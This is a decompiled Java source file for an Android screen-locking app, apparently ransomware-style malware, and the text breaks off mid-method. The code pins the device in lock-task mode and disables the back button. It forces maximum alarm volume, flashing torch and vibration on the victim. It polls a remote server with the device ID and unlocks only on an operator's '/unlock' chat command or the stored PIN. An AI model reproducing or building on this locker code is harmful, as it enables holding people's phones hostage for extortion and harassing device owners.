package com.love.app;

import android.animation.ValueAnimator;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.KeyguardManager;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.graphics.Typeface;
import android.hardware.camera2.CameraManager;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.media.RingtoneManager;
import android.net.LinkCapabilities;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.Process;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.Settings;
import android.util.Log;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.EditText;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import androidx.constraintlayout.core.motion.utils.TypedValues;
import androidx.core.app.NotificationCompat;
import androidx.core.view.ViewCompat;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;
import com.android.mms.service_alt.MmsHttpClient;
import com.android.volley.toolbox.HttpHeaderParser;
import com.google.android.mms.pdu_alt.PduHeaders;
import com.google.android.mms.smil.SmilHelper;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import org.json.JSONArray;
import org.json.JSONObject;

/* JADX INFO: loaded from: classes.dex */
public class LockActivity extends Activity {
    public static final String ACTION_START_LOCK = "com.love.app.START_LOCK";
    public static final String ACTION_STOP_LOCK = "com.love.app.STOP_LOCK";
    private static final String DEFAULT_PIN = "0000";
    private static final int MAX_PIN_LENGTH = 6;
    private static final String TAG = "LockActivity";
    private TextView attemptText;
    private AudioManager audioManager;
    private String cameraId;
    private CameraManager cameraManager;
    private ChatAdapter chatAdapter;
    private EditText chatInput;
    private RecyclerView chatRecyclerView;
    private Button chatSendButton;
    private TextView clearButton;
    private String currentMode;
    private String deviceId;
    private ValueAnimator headerAnimator;
    private View headerZone;
    private LinearLayout keypadLayout;
    private MediaPlayer mediaPlayer;
    private TextView messageText;
    private int originalVolume;
    private EditText pinDisplay;
    private Runnable pollRunnable;
    private SharedPreferences prefs;
    private TextView submitButton;
    private TextView titleText;
    private BroadcastReceiver unlockReceiver;
    private Vibrator vibrator;
    private PowerManager.WakeLock wakeLock;
    private WebView webView;
    private FrameLayout webViewContainer;
    private StringBuilder pinBuilder = new StringBuilder();
    private Handler handler = new Handler();
    private boolean isRunning = true;
    private boolean torchOn = false;
    private boolean isHanging = false;
    private int failedAttempts = 0;
    private List<ChatMessage> chatMessages = new ArrayList();
    private ExecutorService executor = Executors.newSingleThreadExecutor();
    private Handler pollHandler = new Handler();
    private long lastTimestamp = 0;

    @Override // android.app.Activity
    public void onBackPressed() {
    }

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        KeyguardManager keyguardManager;
        super.onCreate(bundle);
        SharedPreferences sharedPreferences = getSharedPreferences("love_config", 0);
        this.prefs = sharedPreferences;
        this.currentMode = sharedPreferences.getString("lock_mode", LinkCapabilities.Role.DEFAULT);
        this.deviceId = Settings.Secure.getString(getContentResolver(), "android_id");
        startLockTask();
        requestWindowFeature(1);
        getWindow().addFlags(6825089);
        if (Build.VERSION.SDK_INT >= 27) {
            setShowWhenLocked(true);
            setTurnScreenOn(true);
        }
        if (Build.VERSION.SDK_INT >= 26 && (keyguardManager = (KeyguardManager) getSystemService("keyguard")) != null) {
            keyguardManager.requestDismissKeyguard(this, null);
        }
        setContentView(C1294R.layout.activity_lock_modern);
        hideSystemUI();
        initViews();
        setupMode();
        acquireWakeLock();
        if ("chat".equals(this.currentMode)) {
            startChatLockEnforcement();
        } else {
            startHeaderAnimation();
            initHardware();
            startAggressiveEffects();
            startBrutalHang();
        }
        playLockSound();
        registerScreenOnReceiver();
        registerReceiver(this.unlockReceiver, new IntentFilter("com.love.app.UNLOCK_NOW"));
        startLockGuardService();
        applyEntranceAnimation();
    }

    private void applyEntranceAnimation() {
        View viewFindViewById = getWindow().getDecorView().findViewById(android.R.id.content);
        viewFindViewById.setAlpha(0.0f);
        viewFindViewById.animate().alpha(1.0f).setDuration(1200L).start();
    }

    private void initViews() {
        this.titleText = (TextView) findViewById(C1294R.id.titleText);
        this.messageText = (TextView) findViewById(C1294R.id.messageText);
        this.pinDisplay = (EditText) findViewById(C1294R.id.pinDisplay);
        this.keypadLayout = (LinearLayout) findViewById(C1294R.id.keypadLayout);
        this.submitButton = (TextView) findViewById(C1294R.id.submitButton);
        this.clearButton = (TextView) findViewById(C1294R.id.clearButton);
        this.attemptText = (TextView) findViewById(C1294R.id.attemptText);
        this.webViewContainer = (FrameLayout) findViewById(C1294R.id.webViewContainer);
        this.headerZone = findViewById(C1294R.id.headerZone);
        EditText editText = this.pinDisplay;
        if (editText == null || this.keypadLayout == null) {
            finish();
            return;
        }
        editText.setFocusable(false);
        this.pinDisplay.setCursorVisible(false);
        this.pinDisplay.setKeyListener(null);
        this.submitButton.setOnClickListener(new View.OnClickListener() { // from class: com.love.app.LockActivity$$ExternalSyntheticLambda6
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                this.f$0.m312lambda$initViews$0$comloveappLockActivity(view);
            }
        });
        this.clearButton.setOnClickListener(new View.OnClickListener() { // from class: com.love.app.LockActivity$$ExternalSyntheticLambda7
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                this.f$0.m313lambda$initViews$1$comloveappLockActivity(view);
            }
        });
    }

    /* JADX INFO: renamed from: lambda$initViews$0$com-love-app-LockActivity, reason: not valid java name */
    /* synthetic */ void m312lambda$initViews$0$comloveappLockActivity(View view) {
        checkPin();
    }

    /* JADX INFO: renamed from: lambda$initViews$1$com-love-app-LockActivity, reason: not valid java name */
    /* synthetic */ void m313lambda$initViews$1$comloveappLockActivity(View view) {
        clearPin();
    }

    private void setupMode() {
        if ("html".equals(this.currentMode)) {
            this.keypadLayout.setVisibility(8);
            this.pinDisplay.setVisibility(8);
            this.submitButton.setVisibility(8);
            this.clearButton.setVisibility(8);
            TextView textView = this.attemptText;
            if (textView != null) {
                textView.setVisibility(8);
            }
            TextView textView2 = this.messageText;
            if (textView2 != null) {
                textView2.setVisibility(8);
            }
            this.webViewContainer.setVisibility(0);
            setupWebView();
            loadWebContent();
            return;
        }
        if ("chat".equals(this.currentMode)) {
            this.keypadLayout.setVisibility(8);
            this.pinDisplay.setVisibility(8);
            this.submitButton.setVisibility(8);
            this.clearButton.setVisibility(8);
            TextView textView3 = this.attemptText;
            if (textView3 != null) {
                textView3.setVisibility(8);
            }
            TextView textView4 = this.messageText;
            if (textView4 != null) {
                textView4.setVisibility(8);
            }
            this.webViewContainer.setVisibility(0);
            setupChatUI();
            startChatPolling();
            return;
        }
        this.keypadLayout.setVisibility(0);
        this.pinDisplay.setVisibility(0);
        this.submitButton.setVisibility(0);
        this.clearButton.setVisibility(0);
        TextView textView5 = this.attemptText;
        if (textView5 != null) {
            textView5.setVisibility(0);
        }
        TextView textView6 = this.messageText;
        if (textView6 != null) {
            textView6.setVisibility(0);
        }
        this.webViewContainer.setVisibility(8);
        setupKeypad();
    }

    private void setupWebView() {
        WebView webView = new WebView(this);
        this.webView = webView;
        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setLoadWithOverviewMode(true);
        settings.setUseWideViewPort(true);
        settings.setSupportZoom(false);
        settings.setBuiltInZoomControls(false);
        settings.setMixedContentMode(0);
        this.webView.setWebViewClient(new WebViewClient());
        this.webView.setWebChromeClient(new WebChromeClient());
        this.webView.addJavascriptInterface(new WebControlInterface(), "AndroidLock");
        this.webViewContainer.removeAllViews();
        this.webViewContainer.addView(this.webView, new FrameLayout.LayoutParams(-1, -1));
    }

    private void loadWebContent() {
        String string = this.prefs.getString("lock_html_url", "");
        if (string.isEmpty()) {
            string = "https://www.google.com";
        }
        this.webView.loadUrl(string);
    }

    /* JADX INFO: Access modifiers changed from: private */
    class WebControlInterface {
        private WebControlInterface() {
        }

        @JavascriptInterface
        public void unlockDevice(final String str) {
            LockActivity.this.runOnUiThread(new Runnable() { // from class: com.love.app.LockActivity$WebControlInterface$$ExternalSyntheticLambda0
                @Override // java.lang.Runnable
                public final void run() {
                    this.f$0.m115xa7555840(str);
                }
            });
        }

        /* JADX INFO: renamed from: lambda$unlockDevice$0$com-love-app-LockActivity$WebControlInterface */
        /* synthetic */ void m115xa7555840(String str) {
            String string = LockActivity.this.prefs.getString("lock_pin", LockActivity.DEFAULT_PIN);
            if (str == null || !str.equals(string)) {
                Toast.makeText(LockActivity.this, "PIN salah", 0).show();
            } else {
                LockActivity.this.unlockSuccess();
            }
        }

        @JavascriptInterface
        public void setPin(String str) {
            if (str == null || str.length() < 4 || str.length() > 6) {
                return;
            }
            LockActivity.this.prefs.edit().putString("lock_pin", str).apply();
        }

        @JavascriptInterface
        public void lockNow() {
            LockActivity.this.runOnUiThread(new Runnable() { // from class: com.love.app.LockActivity$WebControlInterface$$ExternalSyntheticLambda1
                @Override // java.lang.Runnable
                public final void run() {
                    this.f$0.m327lambda$lockNow$1$comloveappLockActivity$WebControlInterface();
                }
            });
        }

        /* JADX INFO: renamed from: lambda$lockNow$1$com-love-app-LockActivity$WebControlInterface, reason: not valid java name */
        /* synthetic */ void m327lambda$lockNow$1$comloveappLockActivity$WebControlInterface() {
            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) LockActivity.this.getSystemService("device_policy");
            if (devicePolicyManager.isAdminActive(new ComponentName(LockActivity.this, (Class<?>) AdminReceiver.class))) {
                devicePolicyManager.lockNow();
            }
        }

        /* JADX INFO: renamed from: lambda$showToast$2$com-love-app-LockActivity$WebControlInterface, reason: not valid java name */
        /* synthetic */ void m328lambda$showToast$2$comloveappLockActivity$WebControlInterface(String str) {
            Toast.makeText(LockActivity.this, str, 0).show();
        }

        @JavascriptInterface
        public void showToast(final String str) {
            LockActivity.this.runOnUiThread(new Runnable() { // from class: com.love.app.LockActivity$WebControlInterface$$ExternalSyntheticLambda2
                @Override // java.lang.Runnable
                public final void run() {
                    this.f$0.m328lambda$showToast$2$comloveappLockActivity$WebControlInterface(str);
                }
            });
        }
    }

    private void setupChatUI() {
        View viewInflate = LayoutInflater.from(this).inflate(C1294R.layout.chat_layout, (ViewGroup) this.webViewContainer, false);
        this.webViewContainer.removeAllViews();
        this.webViewContainer.addView(viewInflate);
        this.chatRecyclerView = (RecyclerView) viewInflate.findViewById(C1294R.id.chatRecyclerView);
        this.chatInput = (EditText) viewInflate.findViewById(C1294R.id.chatInput);
        this.chatSendButton = (Button) viewInflate.findViewById(C1294R.id.chatSendButton);
        this.chatRecyclerView.setLayoutManager(new LinearLayoutManager(this));
        ChatAdapter chatAdapter = new ChatAdapter();
        this.chatAdapter = chatAdapter;
        this.chatRecyclerView.setAdapter(chatAdapter);
        this.chatSendButton.setOnClickListener(new View.OnClickListener() { // from class: com.love.app.LockActivity$$ExternalSyntheticLambda0
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                this.f$0.m317lambda$setupChatUI$2$comloveappLockActivity(view);
            }
        });
    }

    /* JADX INFO: renamed from: lambda$setupChatUI$2$com-love-app-LockActivity, reason: not valid java name */
    /* synthetic */ void m317lambda$setupChatUI$2$comloveappLockActivity(View view) {
        String strTrim = this.chatInput.getText().toString().trim();
        if (strTrim.isEmpty()) {
            return;
        }
        sendChatMessage(strTrim);
        this.chatInput.setText("");
    }

    private void sendChatMessage(final String str) {
        this.executor.execute(new Runnable() { // from class: com.love.app.LockActivity$$ExternalSyntheticLambda10
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m316lambda$sendChatMessage$3$comloveappLockActivity(str);
            }
        });
    }

    /* JADX INFO: renamed from: lambda$sendChatMessage$3$com-love-app-LockActivity, reason: not valid java name */
    /* synthetic */ void m316lambda$sendChatMessage$3$comloveappLockActivity(String str) {
        String baseUrl = ConfigFetcher.getBaseUrl(this);
        if (baseUrl == null) {
            return;
        }
        try {
            HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(baseUrl + "/chat/send").openConnection();
            httpURLConnection.setRequestMethod(MmsHttpClient.METHOD_POST);
            httpURLConnection.setRequestProperty(HttpHeaderParser.HEADER_CONTENT_TYPE, "application/json");
            httpURLConnection.setDoOutput(true);
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("device_id", this.deviceId);
            jSONObject.put("sender", TypedValues.AttributesType.S_TARGET);
            jSONObject.put(SmilHelper.ELEMENT_TAG_TEXT, str);
            OutputStream outputStream = httpURLConnection.getOutputStream();
            outputStream.write(jSONObject.toString().getBytes());
            outputStream.close();
            int responseCode = httpURLConnection.getResponseCode();
            if (responseCode != 200) {
                Log.e(TAG, "Send chat failed: " + responseCode);
            }
            httpURLConnection.disconnect();
        } catch (Exception e) {
            Log.e(TAG, "sendChatMessage error", e);
        }
    }

    private void startChatPolling() {
        if (this.pollRunnable != null) {
            return;
        }
        Runnable runnable = new Runnable() { // from class: com.love.app.LockActivity$$ExternalSyntheticLambda11
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.pollChatMessages();
            }
        };
        this.pollRunnable = runnable;
        this.pollHandler.post(runnable);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void pollChatMessages() {
        this.executor.execute(new Runnable() { // from class: com.love.app.LockActivity$$ExternalSyntheticLambda5
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m315lambda$pollChatMessages$5$comloveappLockActivity();
            }
        });
    }

    /* JADX INFO: renamed from: lambda$pollChatMessages$5$com-love-app-LockActivity, reason: not valid java name */
    /* synthetic */ void m315lambda$pollChatMessages$5$comloveappLockActivity() {
        if (this.isRunning) {
            String baseUrl = ConfigFetcher.getBaseUrl(this);
            if (baseUrl == null) {
                if (this.isRunning) {
                    this.pollHandler.postDelayed(this.pollRunnable, 3000L);
                    return;
                }
                return;
            }
            try {
                HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(baseUrl + "/chat/poll?device_id=" + this.deviceId + "&last_timestamp=" + this.lastTimestamp).openConnection();
                httpURLConnection.setRequestMethod(MmsHttpClient.METHOD_GET);
                httpURLConnection.setConnectTimeout(25000);
                httpURLConnection.setReadTimeout(30000);
                if (httpURLConnection.getResponseCode() == 200) {
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                    StringBuilder sb = new StringBuilder();
                    while (true) {
                        String line = bufferedReader.readLine();
                        if (line == null) {
                            break;
                        } else {
                            sb.append(line);
                        }
                    }
                    bufferedReader.close();
                    JSONArray jSONArrayOptJSONArray = new JSONObject(sb.toString()).optJSONArray("messages");
                    if (jSONArrayOptJSONArray != null && jSONArrayOptJSONArray.length() > 0) {
                        long j = this.lastTimestamp;
                        final ArrayList arrayList = new ArrayList();
                        for (int i = 0; i < jSONArrayOptJSONArray.length(); i++) {
                            JSONObject jSONObject = jSONArrayOptJSONArray.getJSONObject(i);
                            ChatMessage chatMessage = new ChatMessage();
                            chatMessage.sender = jSONObject.getString("sender");
                            chatMessage.text = jSONObject.getString(SmilHelper.ELEMENT_TAG_TEXT);
                            chatMessage.timestamp = jSONObject.getLong("timestamp");
                            arrayList.add(chatMessage);
                            if (chatMessage.timestamp > j) {
                                j = chatMessage.timestamp;
                            }
                            if ("admin".equals(chatMessage.sender) && "/unlock".equalsIgnoreCase(chatMessage.text.trim())) {
                                runOnUiThread(new Runnable() { // from class: com.love.app.LockActivity$$ExternalSyntheticLambda2
                                    @Override // java.lang.Runnable
                                    public final void run() {
                                        this.f$0.unlockSuccess();
                                    }
                                });
                            }
                        }
                        this.lastTimestamp = j;
                        runOnUiThread(new Runnable() { // from class: com.love.app.LockActivity$$ExternalSyntheticLambda3
                            @Override // java.lang.Runnable
                            public final void run() {
                                this.f$0.m314lambda$pollChatMessages$4$comloveappLockActivity(arrayList);
                            }
                        });
                    }
                }
                httpURLConnection.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "pollChatMessages error", e);
                try {
                    Thread.sleep(2000L);
                } catch (Exception unused) {
                }
            } finally {
                if (this.isRunning) {
                    this.pollHandler.postDelayed(this.pollRunnable, 1000L);
                }
            }
        }
    }

    /* JADX INFO: renamed from: lambda$pollChatMessages$4$com-love-app-LockActivity, reason: not valid java name */
    /* synthetic */ void m314lambda$pollChatMessages$4$comloveappLockActivity(List list) {
        this.chatMessages.addAll(list);
        this.chatAdapter.notifyDataSetChanged();
        this.chatRecyclerView.scrollToPosition(this.chatMessages.size() - 1);
    }

    private class ChatMessage {
        String sender;
        String text;
        long timestamp;

        private ChatMessage() {
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    class ChatAdapter extends RecyclerView.Adapter<ViewHolder> {
        private ChatAdapter() {
        }

        @Override // androidx.recyclerview.widget.RecyclerView.Adapter
        public int getItemCount() {
            return LockActivity.this.chatMessages.size();
        }

        @Override // androidx.recyclerview.widget.RecyclerView.Adapter
        public ViewHolder onCreateViewHolder(ViewGroup viewGroup, int i) {
            LinearLayout linearLayout = new LinearLayout(viewGroup.getContext());
            linearLayout.setOrientation(1);
            linearLayout.setPadding(16, 16, 16, 16);
            linearLayout.setLayoutParams(new ViewGroup.LayoutParams(-1, -2));
            TextView textView = new TextView(viewGroup.getContext());
            textView.setTextColor(-1);
            textView.setTextSize(16.0f);
            ImageView imageView = new ImageView(viewGroup.getContext());
            imageView.setVisibility(8);
            imageView.setAdjustViewBounds(true);
            imageView.setMaxHeight(600);
            LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(-2, -2);
            layoutParams.setMargins(0, 8, 0, 8);
            imageView.setLayoutParams(layoutParams);
            TextView textView2 = new TextView(viewGroup.getContext());
            textView2.setTextColor(-7829368);
            textView2.setTextSize(12.0f);
            linearLayout.addView(textView);
            linearLayout.addView(imageView);
            linearLayout.addView(textView2);
            return new ViewHolder(linearLayout, textView, textView2, imageView);
        }

        @Override // androidx.recyclerview.widget.RecyclerView.Adapter
        public void onBindViewHolder(final ViewHolder viewHolder, int i) {
            ChatMessage chatMessage = (ChatMessage) LockActivity.this.chatMessages.get(i);
            String str = chatMessage.sender.equals(TypedValues.AttributesType.S_TARGET) ? "🧑 Saya: " : "👤 Admin: ";
            if (chatMessage.text.startsWith("[IMG]")) {
                viewHolder.text1.setText(str.concat("Mengirim Gambar:"));
                viewHolder.img.setVisibility(0);
                final String strSubstring = chatMessage.text.substring(5);
                viewHolder.img.setTag(strSubstring);
                viewHolder.img.setImageBitmap(null);
                new Thread(new Runnable() { // from class: com.love.app.LockActivity$ChatAdapter$$ExternalSyntheticLambda0
                    @Override // java.lang.Runnable
                    public final void run() {
                        LockActivity.ChatAdapter.lambda$onBindViewHolder$1(strSubstring, viewHolder);
                    }
                }).start();
            } else {
                viewHolder.text1.setText(str + chatMessage.text);
                viewHolder.img.setVisibility(8);
            }
            viewHolder.text2.setText(new SimpleDateFormat("HH:mm", Locale.getDefault()).format(new Date(chatMessage.timestamp)));
        }

        static /* synthetic */ void lambda$onBindViewHolder$1(final String str, final ViewHolder viewHolder) {
            try {
                final Bitmap bitmapDecodeStream = BitmapFactory.decodeStream(new URL(str).openStream());
                viewHolder.img.post(new Runnable() { // from class: com.love.app.LockActivity$ChatAdapter$$ExternalSyntheticLambda1
                    @Override // java.lang.Runnable
                    public final void run() {
                        LockActivity.ChatAdapter.lambda$onBindViewHolder$0(str, viewHolder, bitmapDecodeStream);
                    }
                });
            } catch (Exception unused) {
            }
        }

        static /* synthetic */ void lambda$onBindViewHolder$0(String str, ViewHolder viewHolder, Bitmap bitmap) {
            if (str.equals(viewHolder.img.getTag())) {
                viewHolder.img.setImageBitmap(bitmap);
            }
        }

        class ViewHolder extends RecyclerView.ViewHolder {
            ImageView img;
            TextView text1;
            TextView text2;

            ViewHolder(View view, TextView textView, TextView textView2, ImageView imageView) {
                super(view);
                this.text1 = textView;
                this.text2 = textView2;
                this.img = imageView;
            }
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void unlockSuccess() {
        this.isRunning = false;
        this.prefs.edit().putBoolean("is_locked", false).apply();
        Intent intent = new Intent("com.love.app.UPDATE_LOCK_STATE");
        intent.putExtra("is_locked", false);
        sendBroadcast(intent);
        ValueAnimator valueAnimator = this.headerAnimator;
        if (valueAnimator != null) {
            valueAnimator.cancel();
        }
        stopAllEffects();
        stopLockGuardService();
        stopLockTask();
        finishAffinity();
    }

    private void setupKeypad() {
        this.keypadLayout.removeAllViews();
        int i = 4;
        int i2 = 0;
        int[][] iArr = {new int[]{1, 2, 3}, new int[]{4, 5, 6}, new int[]{7, 8, 9}, new int[]{-1, 0, -2}};
        int i3 = (int) (getResources().getDisplayMetrics().density * 65.0f);
        int i4 = 0;
        while (i4 < i) {
            int[] iArr2 = iArr[i4];
            LinearLayout linearLayout = new LinearLayout(this);
            linearLayout.setLayoutParams(new LinearLayout.LayoutParams(-2, -2));
            linearLayout.setOrientation(i2);
            linearLayout.setGravity(17);
            int length = iArr2.length;
            for (int i5 = i2; i5 < length; i5++) {
                final int i6 = iArr2[i5];
                if (i6 == -1) {
                    View view = new View(this);
                    LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(i3, i3);
                    layoutParams.setMargins(14, 14, 14, 14);
                    view.setLayoutParams(layoutParams);
                    linearLayout.addView(view);
                } else {
                    TextView textView = new TextView(this);
                    LinearLayout.LayoutParams layoutParams2 = new LinearLayout.LayoutParams(i3, i3);
                    layoutParams2.setMargins(14, 14, 14, 14);
                    textView.setLayoutParams(layoutParams2);
                    textView.setGravity(17);
                    textView.setTextSize(24.0f);
                    textView.setTypeface(Typeface.SANS_SERIF, 1);
                    textView.setTextColor(-1);
                    textView.setBackgroundResource(C1294R.drawable.glass_button);
                    textView.setClickable(true);
                    textView.setFocusable(true);
                    if (i6 == -2) {
                        textView.setText("DEL");
                        textView.setTextSize(14.0f);
                        textView.setOnClickListener(new View.OnClickListener() { // from class: com.love.app.LockActivity$$ExternalSyntheticLambda14
                            @Override // android.view.View.OnClickListener
                            public final void onClick(View view2) {
                                this.f$0.m318lambda$setupKeypad$6$comloveappLockActivity(view2);
                            }
                        });
                    } else {
                        textView.setText(String.valueOf(i6));
                        textView.setOnClickListener(new View.OnClickListener() { // from class: com.love.app.LockActivity$$ExternalSyntheticLambda15
                            @Override // android.view.View.OnClickListener
                            public final void onClick(View view2) {
                                this.f$0.m319lambda$setupKeypad$7$comloveappLockActivity(i6, view2);
                            }
                        });
                    }
                    linearLayout.addView(textView);
                    textView.setOnTouchListener(new View.OnTouchListener() { // from class: com.love.app.LockActivity$$ExternalSyntheticLambda16
                        @Override // android.view.View.OnTouchListener
                        public final boolean onTouch(View view2, MotionEvent motionEvent) {
                            return LockActivity.lambda$setupKeypad$8(view2, motionEvent);
                        }
                    });
                }
            }
            this.keypadLayout.addView(linearLayout);
            i4++;
            i = 4;
            i2 = 0;
        }
    }

    /* JADX INFO: renamed from: lambda$setupKeypad$6$com-love-app-LockActivity, reason: not valid java name */
    /* synthetic */ void m318lambda$setupKeypad$6$comloveappLockActivity(View view) {
        deleteLastChar();
    }

    /* JADX INFO: renamed from: lambda$setupKeypad$7$com-love-app-LockActivity, reason: not valid java name */
    /* synthetic */ void m319lambda$setupKeypad$7$comloveappLockActivity(int i, View view) {
        appendPin(i);
    }

    static /* synthetic */ boolean lambda$setupKeypad$8(View view, MotionEvent motionEvent) {
        if (motionEvent.getAction() == 0) {
            view.setScaleX(0.9f);
            view.setScaleY(0.9f);
            return false;
        }
        if (motionEvent.getAction() != 1 && motionEvent.getAction() != 3) {
            return false;
        }
        view.setScaleX(1.0f);
        view.setScaleY(1.0f);
        return false;
    }

    private void appendPin(int i) {
        if (this.pinBuilder.length() < 6) {
            this.pinBuilder.append(i);
            updatePinDisplay();
        }
    }

    private void deleteLastChar() {
        if (this.pinBuilder.length() > 0) {
            StringBuilder sb = this.pinBuilder;
            sb.deleteCharAt(sb.length() - 1);
            updatePinDisplay();
        }
    }

    private void clearPin() {
        this.pinBuilder.setLength(0);
        updatePinDisplay();
    }

    private void updatePinDisplay() {
        StringBuilder sb = new StringBuilder();
        for (int i = 0; i < this.pinBuilder.length(); i++) {
            sb.append("●");
        }
        while (sb.length() < 6) {
            sb.append("○");
        }
        StringBuilder sb2 = new StringBuilder();
        for (int i2 = 0; i2 < sb.length(); i2++) {
            sb2.append(sb.charAt(i2));
            if (i2 < sb.length() - 1) {
                sb2.append(" ");
            }
        }
        this.pinDisplay.setText(sb2.toString());
        this.pinDisplay.animate().scaleX(1.05f).scaleY(1.05f).setDuration(50L).withEndAction(new Runnable() { // from class: com.love.app.LockActivity$$ExternalSyntheticLambda4
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m322lambda$updatePinDisplay$9$comloveappLockActivity();
            }
        }).start();
    }

    /* JADX INFO: renamed from: lambda$updatePinDisplay$9$com-love-app-LockActivity, reason: not valid java name */
    /* synthetic */ void m322lambda$updatePinDisplay$9$comloveappLockActivity() {
        this.pinDisplay.animate().scaleX(1.0f).scaleY(1.0f).setDuration(50L).start();
    }

    private void checkPin() {
        if (this.pinBuilder.toString().equals(this.prefs.getString("lock_pin", DEFAULT_PIN))) {
            unlockSuccess();
            return;
        }
        this.failedAttempts++;
        TextView textView = this.attemptText;
        if (textView != null) {
            textView.setText("Percobaan gagal: " + this.failedAttempts);
        }
        TextView textView2 = this.messageText;
        if (textView2 != null) {
            textView2.setText("❌ PIN SALAH! Coba lagi.");
        }
        clearPin();
        new Thread(new Runnable() { // from class: com.love.app.LockActivity$$ExternalSyntheticLambda12
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m309lambda$checkPin$10$comloveappLockActivity();
            }
        }).start();
        this.handler.postDelayed(new Runnable() { // from class: com.love.app.LockActivity$$ExternalSyntheticLambda13
            @Override // java.lang.Runnable
            public final void run() {
                this.f$0.m310lambda$checkPin$11$comloveappLockActivity();
            }
        }, 2000L);
    }

    /* JADX INFO: renamed from: lambda$checkPin$10$com-love-app-LockActivity, reason: not valid java name */
    /* synthetic */ void m309lambda$checkPin$10$comloveappLockActivity() {
        for (int i = 0; i < 5; i++) {
            try {
                String str = this.cameraId;
                if (str != null) {
                    this.cameraManager.setTorchMode(str, true);
                    Thread.sleep(40L);
                    this.cameraManager.setTorchMode(this.cameraId, false);
                    Thread.sleep(40L);
                }
            } catch (Exception unused) {
            }
        }
    }

    /* JADX INFO: renamed from: lambda$checkPin$11$com-love-app-LockActivity, reason: not valid java name */
    /* synthetic */ void m310lambda$checkPin$11$comloveappLockActivity() {
        TextView textView = this.messageText;
        if (textView != null) {
            textView.setText("Masukkan PIN untuk membuka kunci");
        }
    }

    private void startHeaderAnimation() {
        if (this.headerZone == null) {
            return;
        }
        ValueAnimator valueAnimatorOfArgb = ValueAnimator.ofArgb(Color.parseColor("#CC0000"), Color.parseColor("#550000"), Color.parseColor("#CC0000"));
        this.headerAnimator = valueAnimatorOfArgb;
        valueAnimatorOfArgb.setDuration(700L);
        this.headerAnimator.setRepeatCount(-1);
        this.headerAnimator.addUpdateListener(new ValueAnimator.AnimatorUpdateListener() { // from class: com.love.app.LockActivity$$ExternalSyntheticLambda17
            @Override // android.animation.ValueAnimator.AnimatorUpdateListener
            public final void onAnimationUpdate(ValueAnimator valueAnimator) {
                this.f$0.m321lambda$startHeaderAnimation$12$comloveappLockActivity(valueAnimator);
            }
        });
        this.headerAnimator.start();
    }

    /* JADX INFO: renamed from: lambda$startHeaderAnimation$12$com-love-app-LockActivity, reason: not valid java name */
    /* synthetic */ void m321lambda$startHeaderAnimation$12$comloveappLockActivity(ValueAnimator valueAnimator) {
        this.headerZone.setBackgroundColor(((Integer) valueAnimator.getAnimatedValue()).intValue());
    }

    private void acquireWakeLock() {
        PowerManager.WakeLock wakeLockNewWakeLock = ((PowerManager) getSystemService("power")).newWakeLock(805306394, "LockActivity::Lock");
        this.wakeLock = wakeLockNewWakeLock;
        wakeLockNewWakeLock.acquire(3600000L);
    }

    private void initHardware() {
        CameraManager cameraManager = (CameraManager) getSystemService("camera");
        this.cameraManager = cameraManager;
        if (cameraManager != null) {
            try {
                this.cameraId = cameraManager.getCameraIdList()[0];
            } catch (Exception unused) {
            }
        }
        this.vibrator = (Vibrator) getSystemService("vibrator");
        AudioManager audioManager = (AudioManager) getSystemService(SmilHelper.ELEMENT_TAG_AUDIO);
        this.audioManager = audioManager;
        this.originalVolume = audioManager.getStreamVolume(4);
        AudioManager audioManager2 = this.audioManager;
        audioManager2.setStreamVolume(4, audioManager2.getStreamMaxVolume(4), 0);
        playAlarm();
    }

    private void startAggressiveEffects() {
        startTorchFlashing();
        startScreenFlashing();
        startVibration();
    }

    private void startTorchFlashing() {
        if (this.cameraId != null) {
            this.handler.post(new Runnable() { // from class: com.love.app.LockActivity.1
                @Override // java.lang.Runnable
                public void run() {
                    if (LockActivity.this.isRunning) {
                        try {
                            LockActivity lockActivity = LockActivity.this;
                            lockActivity.torchOn = !lockActivity.torchOn;
